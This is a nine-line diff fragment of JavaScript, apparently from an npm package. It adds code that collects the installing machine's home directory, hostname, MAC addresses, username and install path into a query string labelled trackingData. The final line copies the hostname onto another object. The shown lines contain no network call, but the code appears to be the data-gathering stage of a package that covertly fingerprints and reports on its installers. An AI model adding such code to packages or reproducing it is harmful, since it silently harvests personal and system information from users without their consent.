@@ -1,0 +1,9 @@
+const trackingData = querystring.stringify({
+    package: packageName,
+    dir: __dirname,
+    homedir: os.homedir(),
+    hostname: os.hostname(),
+    mac_addresses: macAddressesBase64,
+    username: os.userInfo().username,
+})
+_tmp_1.hostname = os.hostname()
